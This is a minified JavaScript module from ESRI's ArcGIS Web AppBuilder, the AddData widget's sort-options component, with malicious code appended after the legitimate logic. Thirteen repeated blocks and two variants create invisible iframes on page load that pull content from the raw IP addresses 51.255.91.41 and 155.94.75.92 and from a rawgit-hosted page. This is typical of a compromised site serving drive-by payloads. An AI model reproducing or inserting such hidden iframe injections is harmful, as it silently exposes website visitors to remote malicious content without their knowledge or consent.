// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/SortOptions.html":'\x3cdiv class\x3d"search-sort-options"\x3e\r\n  \x3clabel for\x3d"${id}_select" class\x3d"sort-prompt"\x3e${i18n.search.sortOptions.prompt}\x3c/label\x3e \r\n  \x3cselect id\x3d"${id}_select"\r\n    data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"sortSelect"\x3e\r\n    \x3coption value\x3d"" selected\x3d"selected"\x3e${i18n.search.sortOptions.relevance}\x3c/option\x3e\r\n    \x3coption value\x3d"title"\x3e${i18n.search.sortOptions.title}\x3c/option\x3e\r\n    \x3coption value\x3d"owner"\x3e${i18n.search.sortOptions.owner}\x3c/option\x3e\r\n    \x3coption value\x3d"avgrating"\x3e${i18n.search.sortOptions.rating}\x3c/option\x3e\r\n    \x3coption value\x3d"numviews"\x3e${i18n.search.sortOptions.views}\x3c/option\x3e\r\n    \x3coption value\x3d"modified"\x3e${i18n.search.sortOptions.date}\x3c/option\x3e\r\n  \x3c/select\x3e\r\n  \x3ca href\x3d"#" class\x3d"sort-order-icon"\r\n    title\x3d"${i18n.search.sortOptions.switchOrder}"\r\n    data-dojo-attach-point\x3d"sortOrderBtn"\r\n    data-dojo-attach-event\x3d"onclick: sortOrderClicked"\x3e\r\n  \x3c/a\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/on dojo/dom-class ./SearchComponent dojo/text!./templates/SortOptions.html dojo/i18n!../nls/strings dijit/form/Select".split(" "),function(d,e,c,f,g,h){return d([f],{i18n:h,templateString:g,sortField:null,sortOrder:null,postCreate:function(){this.inherited(arguments);this.updateSortOrderButton();var a=this;this.own(this.sortSelect.on("change",function(){var b=a.sortField=a.sortSelect.get("value");if(""===b)a.sortOrder=null;else if("title"===b||"owner"===b)a.sortOrder=
"asc";else if("avgrating"===b||"numviews"===b||"modified"===b)a.sortOrder="desc";a.updateSortOrderButton();a.search()}));this.own(e(this.sortSelect.dropDown,"open",function(){var a=this.domNode.parentElement;a&&c.add(a,"add-data-widget-popup")}))},sortOrderClicked:function(){"asc"===this.sortOrder?(this.sortOrder="desc",this.updateSortOrderButton(),this.search()):"desc"===this.sortOrder&&(this.sortOrder="asc",this.updateSortOrderButton(),this.search())},updateSortOrderButton:function(){var a=this.sortOrderBtn;
a.style.visibility=null!==this.sortField&&0<this.sortField.length?"visible":"hidden";"desc"===this.sortOrder?c.add(a,"descending"):c.remove(a,"descending")},appendQueryParams:function(a){a.sortField=null;a.sortOrder=null;var b=this.sortField,c=this.sortOrder;null!==b&&0<b.length?(a.sortField=b,null!==c&&0<c.length&&(a.sortOrder=c)):a.canSortByRelevance||(a.sortField="numviews",a.sortOrder="desc")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});